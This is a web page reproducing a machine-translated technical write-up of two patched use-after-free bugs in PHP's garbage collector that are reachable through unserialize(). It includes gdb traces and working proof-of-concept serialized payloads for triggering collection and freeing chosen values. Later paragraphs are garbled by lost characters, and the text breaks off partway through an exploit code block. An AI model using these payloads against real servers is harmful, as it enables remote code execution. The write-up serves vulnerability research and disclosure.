<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We break garbage collection and deserialization in PHP</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hey, PHP, these variables look like trash, okay? 
 Not? Well, look again ... 

 tl; dr: 
 We found two use-after-free vulnerabilities in the garbage c...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We break garbage collection and deserialization in PHP</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/6cf/3d6/b2c/6cf3d6b2c2a1410d271218f0baece5d7.jpg"><br><br>  <sup><i>Hey, PHP, these variables look like trash, okay?</i></sup> <sup><i><br></i></sup>  <sup><i>Not?</i></sup>  <sup><i>Well, look again ...</i></sup> <br><br>  <b>tl; dr:</b> <br>  We found two use-after-free vulnerabilities in the garbage collection algorithm in PHP: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  One is present in all versions of PHP 5 ‚â• 5.3 (fixed in PHP 5.6.23). </li><li>  The second is in all versions of PHP ‚â• 5.3, including versions of PHP 7 (fixed in PHP 5.6.23 and PHP 7.0.8). </li></ul><br>  Vulnerabilities can be remotely applied through the PHP de-serialization function.  Using them, we found RCE on pornhub.com, for which we received a prize of $ 20,000, plus $ 1,000 for each of the two vulnerabilities from the Internet Bug Bounty committee on <a href="https://hackerone.com/evonide">Hackerone</a> . <br><a name="habracut"></a><br>  While testing Pornhub, we found two critical leaks in the SM algorithm ( <a href="https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar">How we broke PHP, hacked Pornhub and earned $ 20,000</a> ).  We are talking about two important use-after-free vulnerabilities that manifest themselves in the interaction of the CM algorithm with certain PHP objects.  They lead to far-reaching consequences, such as using deserialization to remotely execute code on the target system.  In the article we will look at these vulnerabilities. <br><br>  After fuzzing deserialization and analyzing interesting cases, we identified two proofs of the possibility of use-after-free vulnerabilities.  If you are interested in how we came to them, then read the material on the <a href="https://www.evonide.com/fuzzing-unserialize">link</a> .  One example: <br><br><pre><code class="php hljs">$serialized_string = <span class="hljs-string"><span class="hljs-string">'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}'</span></span>; $outer_array = unserialize($serialized_string); gc_collect_cycles(); $filler1 = <span class="hljs-string"><span class="hljs-string">"aaaa"</span></span>; $filler2 = <span class="hljs-string"><span class="hljs-string">"bbbb"</span></span>; var_dump($outer_array); <span class="hljs-comment"><span class="hljs-comment">// Result: // string(4) "bbbb"</span></span></code> </pre> <br>  Perhaps you think that the result will be something like this: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">array</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>) { <span class="hljs-comment"><span class="hljs-comment">//   [1]=&gt; object(ArrayObject)#1 (1) { ["storage":"ArrayObject":private]=&gt; array(2) { //   [1]=&gt; //     [2]=&gt; //     } } }</span></span></code> </pre><br>  In any case, after the execution, we see that the external array (referred to by <code>$outer_array</code> ) is released, and its zval is overwritten by zval'om <code>$filler2</code> .  And as a result, we get <code>bbbb</code> .  The following questions arise: <br><br><ul><li>  Why is the external array freed at all? </li><li>  What does <code>gc_collect_cycles()</code> and is it really necessary to call it manually?  This is very inconvenient for remote use, because many scripts and installations do not call this function at all. </li><li>  Even if we can call it during deserialization, will this example work? </li></ul><br>  Looks like all the magic happens in the <code>gc_collect_cycles</code> function, which calls the PHP garbage collector.  We need to better understand it in order to deal with this mysterious example. <br><br>  Content <br><ul><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">PHP garbage collection</a> <br><ul><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Cyclical links</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Initiating the collector</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Algorithm for marking a graph for cyclic collection (Graph Marking Algorithm for Cycle Collection)</a> </li></ul></li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">POC analysis</a> <br><ul><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Debugging unexpected behavior</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">One descendant of two different parents?</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Missing assembly function and its consequences</a> </li></ul></li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Solving problems with remote execution</a> <br><ul><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Initiating a collector during deserialization</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Deserialization - tough opponent</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Destroying evidence of reference count decrement</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Control over the vacated space</a> </li></ul></li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Use-after-free vulnerability of ZipArchive class.</a> </li><li>  <a href="https://habr.com/ru/company/mailru/blog/308242/">Conclusion</a> </li></ul><br><a name="1"></a><h1>  PHP garbage collection </h1><br>  In earlier versions of PHP, it was not possible to cope with memory leaks due to circular references.  The CM algorithm appeared in PHP 5.3.0 ( <a href="http://php.net/manual/de/features.gc.collecting-cycles.php">PHP manual - Collecting Cycles</a> ).  The collector is active by default, it can be initiated using the <code>zend.enable_gc</code> setting in <code>php.ini</code> . <br><br>  <b>Note: we</b> need basic knowledge of PHP internals, memory management, and things like zval and reference counting.  If you do not know what it is, then first read the basics: <a href="http://www.phpinternalsbook.com/zvals/basic_structure.html">PHP Internals Book - Basic zval structure</a> and <a href="http://www.phpinternalsbook.com/zvals/memory_management.html">PHP Internals Book - Memory managment</a> . <br><br><a name="2"></a><h3>  Cyclical links </h3><br>  To understand the essence of circular references, consider an example: <br><br><pre> <code class="php hljs">$test = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>(); $test[<span class="hljs-number"><span class="hljs-number">0</span></span>] = &amp;$test; <span class="hljs-keyword"><span class="hljs-keyword">unset</span></span>($test);</code> </pre><br>  Since <code>$test</code> refers to itself, its reference count is 2. But even if you <code>unset($test)</code> and the count equals 1, the memory will not be released: a leak will occur.  To solve this problem, the PHP developers created the CM algorithm in accordance with the IBM ‚Äú <a href="http://researcher.watson.ibm.com/researcher/files/us-bacon/Bacon01Concurrent.pdf">Concurrent Cycle Collection in Reference Counted Systems</a> ‚Äù. <br><br><a name="3"></a><h3>  Initiating the collector </h3><br>  The main implementation is available here: <a href="">Zend / zend_gc.c</a> .  Each time zval is destroyed, that is, when it is reset (unset), the CM algorithm is used, which checks whether it is an array or an object.  All other data types (primitives) cannot contain circular references.  The check is implemented by calling the function <code>gc_zval_possible_root</code> .  Any such potential zval is called root and is added to the <code>gc_root_buffer</code> list. <br><br>  These steps are repeated until one of the following conditions is met: <br><br><ul><li>  <i><a href="http://php.net/manual/de/function.gc-collect-cycles.php">gc_collect_cycles</a></i> () is called manually. </li><li>  The amount of memory for storing garbage has been filled.  This means that 10,000 zvals have been saved in the root buffer and another one will now be added.  The default limit of 10,000 is written in GC_ROOT_BUFFER_MAX_ENTRIES in the header section of <a href="">Zend / zend_gc.c</a> .  The next zval will again call <code>gc_zval_possible_root</code> , and that one will already call <code>gc_collect_cycles</code> to process and clear the current buffer so that new items can be stored. </li></ul><br><a name="4"></a><h3>  Algorithm for marking a graph for cyclic collection (Graph Marking Algorithm for Cycle Collection) </h3><br>  The CM algorithm is a graph labeling algorithm applied to the current graph structure.  Nodes of the graph are zval'y like arrays, lines or objects.  Ribs are links / links between zval'ami. <br><br>  For marking nodes, the algorithm mostly uses the following colors: <br><br><ul><li>  <b>Magenta</b> : potential root of the collection cycle.  A node can be a circular reference root.  All nodes initially added to the garbage buffer are marked in purple. </li><li>  <b>Gray</b> : potential member of the collection cycle.  A node can be part of a circular reference. </li><li>  <b>White</b> : member of the collection cycle.  The node must be released after stopping the algorithm. </li><li>  <b>Black</b> : in use or already released.  The node should not be released under any circumstances. </li></ul><br>  To understand the algorithm, take a look at its implementation.  Garbage collection is performed in <code>gc_collect_cycles</code> : <br><br><pre> <code class="cpp hljs"><span class="hljs-string"><span class="hljs-string">"Zend/zend_gc.c"</span></span> [...] <span class="hljs-function"><span class="hljs-function">ZEND_API </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">gc_collect_cycles</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(TSRMLS_D)</span></span></span><span class="hljs-function"> </span></span>{ [...] gc_mark_roots(TSRMLS_C); gc_scan_roots(TSRMLS_C); gc_collect_roots(TSRMLS_C); [...] <span class="hljs-comment"><span class="hljs-comment">/* Free zvals */</span></span> p = GC_G(free_list); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (p != FREE_LIST_END) { q = p-&gt;u.next; FREE_ZVAL_EX(&amp;p-&gt;z); p = q; } [...] }</code> </pre><br>  This function takes care of the following four simple operations: <br><br><ol><li>  <code>gc_mark_roots(TSRMLS_C)</code> : apply <code>zval_mark_grey</code> to all magenta elements in <code>gc_root_buffer</code> .  With respect to the current zval, <code>zval_mark_grey</code> does the following: <br><ul><li>  - returns if zval is already marked gray; </li><li>  - marks zval with gray; </li><li>  - gets all child zval's (only if the current zval is an array or an object); </li><li>  - decrements the reference counts of the child zvals to 1 and calls the <code>zval_mark_grey</code> . </li></ul><br>  In general, at this stage, the root and other available zval'y are marked gray, all these zval are decremented reference counts. </li><li>  gc_scan_roots (TSRMLS_C): applies zval_scan (unfortunately, does not call zval_mark_white) to all elements in gc_root_buffer.  With respect to the current zval, zval_scan does the following: <br>  - returns if zval is not gray; <br>  - if the reference count is greater than zero, calls zval_scan_black (unfortunately, zval_mark_black is not called).  In fact, zval_scan_black cancels all actions previously performed by zval_mark_grey to all counters, and marks all available zvals with black; <br>  - the current zval is marked white, and zval_scan is applied to all child zvals (only if the current zval is an array or an object). <br>  In general, at this stage, it is determined which of the gray zvals should now be marked with black or white. </li><li>  <code>gc_collect_roots(TSRMLS_C)</code> : all white zval link counters are restored.  They are also added to the <code>gc_zval_to_free</code> list, equivalent to the <code>gc_free_list</code> list. </li><li>  Finally, all <code>gc_free_list</code> elements, i.e., marked with white, are released. </li></ol><br>  This algorithm identifies and releases all elements of circular references, first marking them with white, then collecting and freeing them.  A more detailed analysis of the implementation revealed the following potential conflicts: <br><br><ul><li>  At stage 1.4, <code>zval_mark_grey</code> decrements the counters of all child zvals before checking them for gray marking. </li><li>  Since zval's reference counters are temporarily decremented, any side effect (like checking weakened counters) or other manipulations can lead to disastrous consequences. </li></ul><br><a name="5"></a><h1>  POC analysis </h1><br>  Armed with new knowledge about the garbage collector, we can re-analyze the example with the detected vulnerability.  Call the following serialized string: <br><br><pre> <code class="php hljs">$serialized_string = <span class="hljs-string"><span class="hljs-string">'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}'</span></span>;</code> </pre><br>  Using gdb, we can use the <a href="https://github.com/php/php-src/blob/PHP-5.6.23/.gdbinit">standard for PHP 5.6 .gdbinit</a> , as well as a custom routine for dumping the contents of the garbage collector buffer. <br><br><pre> <code class="php hljs">define dumpgc set $current = gc_globals.roots.next printf <span class="hljs-string"><span class="hljs-string">"GC buffer content:\n"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> $current != &amp;gc_globals.roots printzv $current.u.pz set $current = $current.next end end</code> </pre><br>  Now set the breakpoint in the <code>gc_mark_roots</code> and <code>gc_scan_roots</code> to see the status of all relevant reference counters. <br><br>  We need to find the answer to the question: why is the external array freed?  Load the php process into gdb, set breakpoints and execute the script. <br><br><pre> <code class="bash hljs">(gdb) r poc1.php [...] Breakpoint 1, gc_mark_roots () at [...] (gdb) dumpgc GC roots buffer content: [0x109f4b0] (refcount=2) array(1): { // outer_array 1 =&gt; [0x109d5c0] (refcount=1) object(ArrayObject) <span class="hljs-comment"><span class="hljs-comment">#1 } [0x109ea20] (refcount=2,is_ref) array(2): { // inner_array 1 =&gt; [0x109ea20] (refcount=2,is_ref) array(2): // reference to inner_array 2 =&gt; [0x109f4b0] (refcount=2) array(1): // reference to outer_array }</span></span></code> </pre><br>  As you can see, after deserialization, both arrays (internal and external) are added to the garbage collector buffer.  If we continue and stop at <code>gc_scan_roots</code> , we get the following states of reference counters: <br><br><pre> <code class="bash hljs">(gdb) c [...] Breakpoint 2, gc_scan_roots () at [...] (gdb) dumpgc GC roots buffer content: [0x109f4b0] (refcount=0) array(1): { //   1 =&gt; [0x109d5c0] (refcount=0) object(ArrayObject) <span class="hljs-comment"><span class="hljs-comment">#1 }</span></span></code> </pre><br>  <code>gc_mark_roots</code> really decremented all counters to zero.  Therefore, these nodes in the following steps can be marked white and later released.  But the question arises: why in the first case, the counters were reset? <br><br><a name="6"></a><h3>  Debugging unexpected behavior </h3><br>  Let's go step by step through the <code>gc_mark_roots</code> and <code>zval_mark_grey</code> to understand what is happening. <br><br><ol><li>  <code>zval_mark_grey</code> applied to <code>outer_array</code> (remember that <code>outer_array</code> added to the garbage collection buffer). </li><li>  <code>outer_array</code> marked gray, and all its descendants are extracted.  In our case, <code>outer_array</code> only one descendant: <br>  <code>‚Äúobject(ArrayObject) #1‚Äù</code> (refcount = 1). </li><li>  The reference count of the child or <code>ArrayObject</code> decremented: <br>  <code>‚Äúobject(ArrayObject) #1‚Äù</code> (refcount = 0). </li><li>  <code>zval_mark_grey</code> applied to an <code>ArrayObject</code> . </li><li>  This object is marked gray, and all its descendants are extracted.  In this case, these include references to <code>inner_array</code> and <code>outer_array</code> . </li><li>  The reference counts for both descendants, i.e., for both zvals that are referenced, are decremented: <br>  Outer_array (refcount = 1) and inner_array (refcount = 1). </li><li>  <code>zval_mark_grey</code> applied to outer_array without any effect, because outer_array is already grayed out (it was processed in the second stage). </li><li>  <code>zval_mark_grey</code> applied to inner_array.  It is marked gray, and all its children are extracted.  Children are the same as in the fifth stage. </li><li>  The reference counts of both descendants are decremented <u>again</u> : <br>  ‚ÄúOuter_array‚Äù (refcount = 0) and ‚Äúinner_array‚Äù (refcount = 0). </li><li>  More zval'ov left, <code>zval_mark_grey</code> interrupted. </li></ol><br>  So, the links contained in <code>inner_array</code> or <code>ArrayObject</code> are <b>decremented twice</b> !  This is definitely an unexpected behavior, because any link must be decremented one time.  In particular, the eighth stage should not be at all, because all elements have already been processed and marked earlier, at the sixth stage. <br><br>  <b>Note:</b> the labeling algorithm assumes that each element can have only one parent element.  Obviously, in this case, this assumption is wrong. <br><br>  So why can one element be returned as a child of two different parents? <br><br><a name="7"></a><h3>  One descendant of two different parents? </h3><br>  To answer this question, you need to examine how child zvals are extracted from parent objects: <br><br><pre> <code class="cpp hljs"><span class="hljs-string"><span class="hljs-string">"Zend/zend_gc.c"</span></span> [...] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">zval_mark_grey</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(zval *pz TSRMLS_DC)</span></span></span><span class="hljs-function"> </span></span>{ [...] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Z_TYPE_P(pz) == IS_OBJECT &amp;&amp; EG(objects_store).object_buckets) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (EXPECTED(EG(objects_store).object_buckets[Z_OBJ_HANDLE_P(pz)].valid &amp;&amp; (get_gc = Z_OBJ_HANDLER_P(pz, get_gc)) != <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>)) { [...] HashTable *props = get_gc(pz, &amp;table, &amp;n TSRMLS_CC); [...] }</code> </pre><br>  If the processed zval is an object, the function will call the <code>get_gc</code> special handler.  It must return a hash table with all descendants.  After further debugging, I discovered that this leads to the <code>spl_array_get_properties</code> call: <br><br><pre> <code class="cpp hljs"><span class="hljs-string"><span class="hljs-string">"ext/spl/spl_array.c"</span></span> [...] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> HashTable *</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spl_array_get_properties</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(zval *object TSRMLS_DC)</span></span></span><span class="hljs-function"> </span><span class="hljs-comment"><span class="hljs-function"><span class="hljs-comment">/* {{{ */</span></span></span><span class="hljs-function"> </span></span>{ [...] result = spl_array_get_hash_table(intern, <span class="hljs-number"><span class="hljs-number">1</span></span> TSRMLS_CC); [...] <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> result; }</code> </pre><br>  In general, the hash table of the <code>ArrayObject</code> internal array is <code>ArrayObject</code> .  The error is that it is used in two different contexts when the algorithm tries to gain access: <br><br><ul><li>  to the descendant of <code>zval' ArrayObject</code> ; </li><li>  to the descendant of <code>inner_array</code> . </li></ul><br>  It may seem to you that at the first stage something is missed, because returning the <code>inner_array</code> hash table is almost the same as processing at the first stage, when it should be marked in gray, therefore <code>inner_array</code> should not be processed again in the second stage! <br><br>  Therefore, the question arises: why was the <code>inner_array</code> not grayed out at the first stage?  Let's look again at how <code>zval_mark_grey</code> retrieves the descendants of the parent object: <br><br><pre> <code class="cpp hljs">HashTable *props = get_gc(pz, &amp;table, &amp;n TSRMLS_CC);</code> </pre><br>  This method should call the object's garbage collection function.  It looks like this: <br><br><pre> <code class="cpp hljs"><span class="hljs-string"><span class="hljs-string">"ext/spl/php_date.c"</span></span> [...] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> HashTable *</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">date_object_get_gc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(zval *object, zval ***table, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *n TSRMLS_DC)</span></span></span><span class="hljs-function"> </span></span>{ *table = <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>; *n = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> zend_std_get_properties(object TSRMLS_CC); }</code> </pre><br>  As you can see, the returned hash table should contain only its own object properties.  It also stores the parameter zval'a <code>table</code> , which is passed by reference and is used as the second "return parameter".  This zval must contain all the zvals referenced by the object in other contexts.  For example, all objects / zval'y can be stored in <code>SplObjectStorage</code> . <br><br>  For our particular script with <code>ArrayObject</code> we can expect that the zval <code>table</code> will contain an <code>inner_array</code> .  Then why is <code>spl_array_get_gc</code> called instead of <code>spl_array_get_properties</code> ? <br><br><a name="8"></a><h3>  Missing assembly function and its consequences </h3><br>  The answer is simple: <code>spl_array_get_gc</code> does not exist!  PHP developers have forgotten to implement the garbage collection function for <code>ArrayObjects</code> .  But it still does not explain why <code>spl_array_get_properties</code> is <code>spl_array_get_properties</code> .  To find out, let's deal with the initialization of objects in general: <br><br><pre> <code class="cpp hljs"><span class="hljs-string"><span class="hljs-string">"Zend/zend_object_handlers.c"</span></span> [...] <span class="hljs-function"><span class="hljs-function">ZEND_API HashTable *</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">zend_std_get_gc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(zval *object, zval ***table, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *n TSRMLS_DC)</span></span></span><span class="hljs-function"> </span><span class="hljs-comment"><span class="hljs-function"><span class="hljs-comment">/* {{{ */</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Z_OBJ_HANDLER_P(object, get_properties) != zend_std_get_properties) { *table = <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>; *n = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Z_OBJ_HANDLER_P(object, get_properties)(object TSRMLS_CC); [...] }</code> </pre><br>  The standard behavior of the missing garbage collection function depends on the <code>get_properties</code> object's own method, if specified. <br><br>  Fuh, it seems we have found the answer to the first question.  The main cause of the vulnerability is that there is no garbage collection function for <code>ArrayObjects</code> . <br><br>  Oddly enough, it <a href="https://github.com/php/php-src/commit/4e03ba4a6ef4c16b53e49e32eb4992a797ae08a8">appeared in PHP 7.1.0 alpha2</a> almost immediately after the release.  It turns out that all versions of PHP ‚â• 5.3 and PHP &lt;7 are vulnerable. Unfortunately, as we will see later, this bug cannot be initiated during deserialization without additional gestures.  So later I had to prepare the possibility of using an exploit.  From now on, we will call the vulnerability a ‚Äúdouble-decrement bug.‚Äù  It is described here: <a href="https://bugs.php.net/bug.php%3Fid%3D72433">PHP Bug - ID 72433</a> - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2016-5771">CVE-2016-5771</a> . <br><br><a name="9"></a><h1>  Solving problems with remote execution </h1><br>  We still need to get answers to two of the three initial questions.  Let's start with this: is it really necessary to manually call <code>gc_collect_cycles</code> ? <br><br><a name="10"></a><h3>  Initiating a collector during deserialization </h3><br>  At first, I strongly doubted that we would be able to initiate the collector.  However, as mentioned above, there is a way to automatically call the garbage collector - when the limit of the garbage buffer by the number of potential root elements is reached.  I came up with this method: <br><br><pre> <code class="php hljs">define(<span class="hljs-string"><span class="hljs-string">"GC_ROOT_BUFFER_MAX_ENTRIES"</span></span>, <span class="hljs-number"><span class="hljs-number">10000</span></span>); define(<span class="hljs-string"><span class="hljs-string">"NUM_TRIGGER_GC_ELEMENTS"</span></span>, GC_ROOT_BUFFER_MAX_ENTRIES+<span class="hljs-number"><span class="hljs-number">5</span></span>); $overflow_gc_buffer = str_repeat(<span class="hljs-string"><span class="hljs-string">'i:0;a:0:{}'</span></span>, NUM_TRIGGER_GC_ELEMENTS); $trigger_gc_serialized_string = <span class="hljs-string"><span class="hljs-string">'a:'</span></span>.(NUM_TRIGGER_GC_ELEMENTS).<span class="hljs-string"><span class="hljs-string">':{'</span></span>.$overflow_gc_buffer.<span class="hljs-string"><span class="hljs-string">'}'</span></span>; unserialize($trigger_gc_serialized_string);</code> </pre><br>  If you look at the gdb described above, you will see that <code>gc_collect_cycles</code> indeed called.  This trick only works because deserialization allows you to transfer the same index many times (in this example, index 0).  When reusing an array index, the reference count of the old element must be decremented.  To do this, the deserialization process calls <code>zend_hash_update</code> , which calls the destructor of the old element. <br><br>  Each time zval is destroyed, the CM algorithm is applied.  This means that all created arrays will fill the garbage buffer until it overflows, after which <code>gc_collect_cycles</code> will be called. <br><br>  Incredible news!  We do not need to manually initiate the garbage collection procedure on the target system.  Unfortunately, a new, even more difficult problem has arisen. <br><br><a name="11"></a><h3>  Deserialization - tough opponent </h3><br>  At the moment, the question remains unanswered: even if during deserialization we can call the collector, will the double decrement bug still work in the context of deserialization? <br><br>  After testing, we quickly came to the conclusion that the answer is no.  This is a consequence of the fact that the <u>values ‚Äã‚Äãof the reference counters of all elements during deserialization are higher than after it</u> .  The deserializer keeps track of all deserializable elements so that links can be customized.  All these entries are stored in the <code>var_hash</code> list.  And when deserialization comes to an end, the records are destroyed using the <code>var_destroy</code> function. <br><br>  In this example, you can see for yourself the problem of large reference counters: <br><br><pre> <code class="php hljs">$reference_count_test = unserialize(<span class="hljs-string"><span class="hljs-string">'a:2:{i:0;i:1337;i:1;r:2;}'</span></span>); debug_zval_dump($reference_count_test); <span class="hljs-comment"><span class="hljs-comment">/* Result: array(2) refcount(2){ [0]=&gt; long(1337) refcount(2) [1]=&gt; long(1337) refcount(2) } */</span></span></code> </pre><br>  The counter of the integer zval'a 1337 after deserialization is equal to 2. By setting the breakpoint until the deserialization stops (for example, in the <code>var_destroy</code> call) and <code>var_hash</code> contents of the <code>var_hash</code> , we will see the following counter values: <br><br><pre> <code class="bash hljs">[0x109e820] (refcount=2) array(2): { 0 =&gt; [0x109cf70] (refcount=4) long: 1337 1 =&gt; [0x109cf70] (refcount=4) long: 1337 }</code> </pre><br>  The double decrement bug allows us to decrement the counter of any selected item twice.  However, as we can see from these numbers, for each additional reference assigned to any element, we have to pay by increasing the reference count by 2. <br><br>  Lying in sleeplessness at four in the morning and thinking about all these problems, I finally remembered one important thing: the <code>ArrayObject</code> function takes a reference to another array for initialization.  That is, if you deserialize <code>ArrayObject</code> , you can simply refer to any array that is already deserialized.  This allows decrementing all records of a specific hash table twice.  The sequence of actions is as follows: <br><br><ul><li>  We have a target zval X that needs to be released. </li><li>  Create an array Y containing several references to zval X: <br> <code>array(ref_to_X, ref_to_X, [‚Ä¶], ref_to_X)</code> </li> <li>  Create an <code>ArrayObject</code> that will be initialized with the contents of the Y array. Therefore, it will return all descendants of the Y array when processed by the garbage collector marking algorithm. </li></ul><br>  Using this instruction, we can manipulate the labeling algorithm to process all the links in the Y array twice. But, as mentioned above, creating the link will result in the reference counter increasing by 2 during deserialization. So double-processing the link will be equivalent to as if we initially ignored the link.  The trick is to add the following item to our sequence: <br><br><ul><li>  Create an additional <code>ArrayObject</code> with the same settings as the previous one. </li></ul><br>  When the labeling algorithm goes to the second <code>ArrayObject</code> , it starts decrementing all references in the Y array for the third time. Now we can get the negative delta of the reference counter and reset the counter of any target zval! <br><br>  Since these <code>ArrayObject</code> are used for decrementing counters, I will now call them <code>DecrementorObject</code> . <br><br>  Unfortunately, even after we managed to reset the counter of any target zval, the CM algorithm does not release them ... <br><br><a name="12"></a><h3>  Destroying evidence of reference count decrement </h3><br>  After lengthy debugging, I discovered a key problem with the above sequence of actions.  I assumed that, as soon as the node is marked white, it is finally released.  But it turned out that the white knot could later be marked black again. <br><br>        : <br><br><ul><li>   <code>gc_mark_roots</code>  <code>zval_mark_grey</code> ,    zval'   0. </li><li>     <code>gc_scan_roots</code> ,  ,  zval'   ,   .     zval   (     0). </li><li>      <code>DecrementorObject</code> ',  ,      0,         .  ,   zval      <code>DecrementorObject</code> '. ,   . </li></ul><br> ,   -    .   ,    <code>DecrementorObject</code> '    <code>zval_mark_grey</code> .         ,      : <br><br><pre> <code class="php hljs"> <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( ref_to_X, ref_to_X, DecrementorObject, DecrementorObject) ----- ------------------------------------ <span class="hljs-comment"><span class="hljs-comment">/* | | target_zval each one is initialized with the X contents of array X */</span></span></code> </pre><br>    ,  <code>DecrementorObject</code> '      .    ,          ,    <code>gc_mark_roots</code>   zval'.           : <br><br><pre> <code class="php hljs">define(<span class="hljs-string"><span class="hljs-string">"GC_ROOT_BUFFER_MAX_ENTRIES"</span></span>, <span class="hljs-number"><span class="hljs-number">10000</span></span>); define(<span class="hljs-string"><span class="hljs-string">"NUM_TRIGGER_GC_ELEMENTS"</span></span>, GC_ROOT_BUFFER_MAX_ENTRIES+<span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-comment"><span class="hljs-comment">//   . $overflow_gc_buffer = str_repeat('i:0;a:0:{}', NUM_TRIGGER_GC_ELEMENTS); // decrementor_object        ($free_me). $decrementor_object = 'C:11:"ArrayObject":19:{x:i:0;r:3;;m:a:0:{}}'; //          $free_me (id=3). $target_references = 'i:0;r:3;i:1;r:3;i:2;r:3;i:3;r:3;'; //   , . . ,       . $free_me = 